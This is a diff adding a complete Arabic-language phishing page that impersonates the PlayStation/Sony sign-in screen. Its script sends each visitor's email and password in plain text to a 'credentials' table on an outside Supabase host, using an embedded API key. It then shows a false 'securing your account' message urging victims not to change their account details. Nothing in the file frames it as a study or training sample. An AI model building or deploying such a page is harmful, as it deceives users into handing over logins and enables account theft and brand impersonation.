@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PlayStation - تسجيل الدخول</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}
+body{
+  background:linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+  min-height:100vh;display:flex;flex-direction:column;align-items:center;
+  background-image:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 900"><circle cx="200" cy="100" r="300" fill="rgba(0,156,229,.03)"/><circle cx="1200" cy="700" r="400" fill="rgba(0,156,229,.03)"/><circle cx="700" cy="800" r="250" fill="rgba(0,156,229,.02)"/></svg>');
+  background-size:cover;
+}
+
+.header{
+  width:100%;padding:20px 40px;display:flex;align-items:center;justify-content:center;
+}
+.header img{height:50px}
+.header .logo-text{color:#fff;font-size:32px;font-weight:700;letter-spacing:2px}
+.header .logo-text span{color:#0070cc}
+
+.main{display:flex;align-items:center;justify-content:center;width:100%;max-width:1000px;padding:20px;gap:40px;flex-wrap:wrap;margin-top:20px}
+
+/* الجانب الأيسر - صور PlayStation */
+.left-side{flex:1;min-width:300px;text-align:center}
+.left-side .console-img{max-width:100%;height:auto;filter:drop-shadow(0 20px 60px rgba(0,112,204,.3))}
+.left-side h1{color:#fff;font-size:36px;font-weight:700;margin-top:20px}
+.left-side p{color:#8a8fa8;font-size:16px;margin-top:8px;line-height:1.6}
+
+/* الجانب الأيمن - نموذج تسجيل الدخول */
+.right-side{background:rgba(255,255,255,.05);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+  border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:40px;width:400px;box-shadow:0 8px 32px rgba(0,0,0,.4)}
+.right-side h2{color:#fff;font-size:24px;font-weight:600;margin-bottom:6px;text-align:center}
+.right-side .subtitle{color:#8a8fa8;font-size:14px;text-align:center;margin-bottom:28px}
+
+.form-group{margin-bottom:16px}
+.form-group label{color:#b0b3c5;font-size:13px;font-weight:600;display:block;margin-bottom:6px}
+.form-group input{width:100%;padding:14px 16px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);
+  border-radius:8px;color:#fff;font-size:16px;outline:none;transition:all .3s;direction:ltr;text-align:left}
+.form-group input::placeholder{color:#5c5f7a}
+.form-group input:focus{border-color:#0070cc;background:rgba(255,255,255,.12);box-shadow:0 0 0 3px rgba(0,112,204,.2)}
+
+.login-btn{width:100%;padding:14px;background:#0070cc;color:#fff;border:none;border-radius:8px;font-size:17px;
+  font-weight:700;cursor:pointer;transition:all .3s;margin-top:4px}
+.login-btn:hover{background:#0059a3;transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,112,204,.4)}
+.login-btn:disabled{background:#004580;cursor:not-allowed;transform:none;box-shadow:none}
+
+.divider{display:flex;align-items:center;margin:24px 0;color:#5c5f7a;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid rgba(255,255,255,.1)}
+.divider::before{margin-left:16px}
+.divider::after{margin-right:16px}
+
+.alt-btn{width:100%;padding:12px;background:transparent;color:#b0b3c5;border:1px solid rgba(255,255,255,.15);
+  border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:all .3s;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:10px}
+.alt-btn:hover{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.25)}
+.alt-btn .icon{font-size:20px}
+
+.links{text-align:center;margin-top:20px}
+.links a{color:#8a8fa8;font-size:13px;text-decoration:none;margin:0 10px;transition:color .3s}
+.links a:hover{color:#0070cc}
+
+.footer{width:100%;text-align:center;padding:30px;color:#5c5f7a;font-size:12px;margin-top:auto}
+.footer a{color:#5c5f7a;text-decoration:none;margin:0 8px}
+.footer a:hover{color:#8a8fa8}
+
+/* نافذة الرسالة بعد تسجيل الدخول */
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:9999;align-items:center;justify-content:center;direction:rtl}
+.overlay-box{background:#1a1a2e;border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:40px;max-width:480px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+.overlay-box .icon{margin-bottom:16px}
+.overlay-box .icon svg{width:64px;height:64px}
+.overlay-box h2{color:#fff;font-size:22px;margin-bottom:12px}
+.overlay-box p{color:#b0b3c5;font-size:16px;line-height:1.8;margin-bottom:24px}
+.overlay-box .ok-btn{background:#0070cc;color:#fff;border:none;border-radius:8px;padding:12px 48px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s}
+.overlay-box .ok-btn:hover{background:#0059a3}
+
+.loading-spinner{display:none;width:20px;height:20px;border:3px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo-text">Play<span>Station</span></div>
+</div>
+
+<div class="main">
+  <!-- الجانب الأيسر -->
+  <div class="left-side">
+    <svg class="console-img" viewBox="0 0 400 200" width="400" height="200">
+      <!-- PlayStation console icon -->
+      <rect x="50" y="60" width="300" height="80" rx="12" fill="#2d2d3d" stroke="#3d3d4d" stroke-width="2"/>
+      <rect x="60" y="70" width="40" height="15" rx="4" fill="#1a1a2e"/>
+      <rect x="60" y="92" width="40" height="15" rx="4" fill="#1a1a2e"/>
+      <rect x="60" y="114" width="40" height="15" rx="4" fill="#1a1a2e"/>
+      <circle cx="320" cy="100" r="20" fill="#1a1a2e" stroke="#3d3d4d" stroke-width="2"/>
+      <circle cx="320" cy="100" r="8" fill="#0070cc"/>
+      <rect x="110" y="72" width="160" height="8" rx="4" fill="#3d3d4d"/>
+      <rect x="110" y="120" width="160" height="8" rx="4" fill="#3d3d4d"/>
+      <line x1="200" y1="60" x2="200" y2="140" stroke="#3d3d4d" stroke-width="1" opacity=".3"/>
+    </svg>
+    <h1>مرحباً بك في PlayStation</h1>
+    <p>قم بتسجيل الدخول للوصول إلى ألعابك<br>وأصدقائك وإنجازاتك</p>
+  </div>
+
+  <!-- الجانب الأيمن - نموذج تسجيل الدخول -->
+  <div class="right-side">
+    <h2>تسجيل الدخول</h2>
+    <p class="subtitle">ادخل بيانات حسابك في PlayStation</p>
+    
+    <form id="loginForm">
+      <div class="form-group">
+        <label>البريد الإلكتروني</label>
+        <input id="email" type="email" placeholder="example@email.com" required>
+      </div>
+      <div class="form-group">
+        <label>كلمة المرور</label>
+        <input id="password" type="password" placeholder="••••••••" required>
+      </div>
+      <button type="submit" class="login-btn" id="loginBtn">
+        <span id="btnText">تسجيل الدخول</span>
+        <div id="loader" class="loading-spinner"></div>
+      </button>
+    </form>
+
+    <div class="divider">أو</div>
+
+    <button class="alt-btn" onclick="alert('قريباً')">
+      <span class="icon">🔵</span> تسجيل الدخول باستخدام QR
+    </button>
+    <button class="alt-btn" onclick="alert('قريباً')">
+      <span class="icon">🔗</span> ربط حساب Sony
+    </button>
+
+    <div class="links">
+      <a href="#">نسيت كلمة المرور؟</a>
+      <a href="#">إنشاء حساب</a>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">سياسة الخصوصية</a> • 
+  <a href="#">شروط الخدمة</a> • 
+  <a href="#">اتصل بنا</a>
+  <br><br>
+  © 2026 Sony Interactive Entertainment LLC
+</div>
+
+<!-- نافذة الرسالة بعد تسجيل الدخول -->
+<div id="successOverlay" class="overlay">
+  <div class="overlay-box">
+    <div class="icon">
+      <svg viewBox="0 0 64 64" fill="none">
+        <circle cx="32" cy="32" r="30" stroke="#0070cc" stroke-width="2"/>
+        <circle cx="32" cy="32" r="20" fill="#0070cc" opacity=".2"/>
+        <path d="M28 36l-6-6-2 2 8 8 16-16-2-2-14 14z" fill="#0070cc"/>
+      </svg>
+    </div>
+    <h2>جاري تأمين الحساب</h2>
+    <p>سنحاول عكس الاختراق.<br>يرجى عدم تغيير أي معلومات متعلقة بحسابك.</p>
+    <button class="ok-btn" onclick="closeOverlay()">حسناً</button>
+  </div>
+</div>
+
+<script>
+// ========== ضع المفتاح الصحيح من Settings → API في Supabase ==========
+const SUPABASE_URL = 'https://fnqecgvmezdiuqzembqt.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZucWVjZ3ZtZXpkaXVxemVtYnF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3ODkxMDEsImV4cCI6MjA5MDM2NTEwMX0.EHsg5Uhpsb6g59R4j8s_XZcm_xQKLXD-P78-eCVz9ww';
+
+// ========== DOM ==========
+const loginForm = document.getElementById('loginForm');
+const loginBtn = document.getElementById('loginBtn');
+const btnText = document.getElementById('btnText');
+const loader = document.getElementById('loader');
+
+// ========== حفظ البيانات في Supabase ==========
+async function saveCredentials(email, password) {
+  try {
+    const res = await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`
+      },
+      body: JSON.stringify({ email: email, password: password })
+    });
+    
+    console.log('Supabase response:', res.status);
+    
+    if (res.ok) {
+      console.log('✅ تم حفظ:', email);
+      return true;
+    } else {
+      const errText = await res.text();
+      console.error('❌ فشل الحفظ:', errText);
+      return false;
+    }
+  } catch(e) {
+    console.error('❌ خطأ في الاتصال:', e);
+    return false;
+  }
+}
+
+// ========== تسجيل الدخول ==========
+loginForm.addEventListener('submit', async function(e) {
+  e.preventDefault();
+  
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value.trim();
+  
+  if (!email || !password) return;
+  
+  // تشغيل حالة التحميل
+  loginBtn.disabled = true;
+  btnText.style.display = 'none';
+  loader.style.display = 'block';
+  
+  // حفظ البيانات في Supabase
+  await saveCredentials(email, password);
+  
+  // إظهار الرسالة
+  document.getElementById('successOverlay').style.display = 'flex';
+  
+  // إعادة الزر لحالته الطبيعية
+  loginBtn.disabled = false;
+  btnText.style.display = 'inline';
+  loader.style.display = 'none';
+});
+
+function closeOverlay() {
+  document.getElementById('successOverlay').style.display = 'none';
+  document.getElementById('email').value = '';
+  document.getElementById('password').value = '';
+}
+</script>
+
+</body>
+</html>
